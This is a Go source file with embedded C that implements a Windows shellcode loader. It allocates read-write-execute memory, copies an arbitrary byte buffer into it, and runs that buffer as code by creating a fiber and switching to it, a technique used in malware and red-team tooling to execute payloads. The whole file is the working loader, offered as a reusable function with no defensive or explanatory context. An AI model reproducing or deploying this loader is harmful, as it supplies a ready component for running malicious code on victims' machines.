package cloader

/*
#include <windows.h>

void fiber(uintptr_t p, int len) {
	LPVOID Memory = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, (void*)p, len);

	PVOID mFiber = ConvertThreadToFiber(NULL);
	PVOID pFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)Memory, NULL);
	SwitchToFiber(pFiber);
	DeleteFiber(pFiber);
}
*/
import "C"
import "unsafe"

func Fiber(p []byte) {
	C.fiber((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
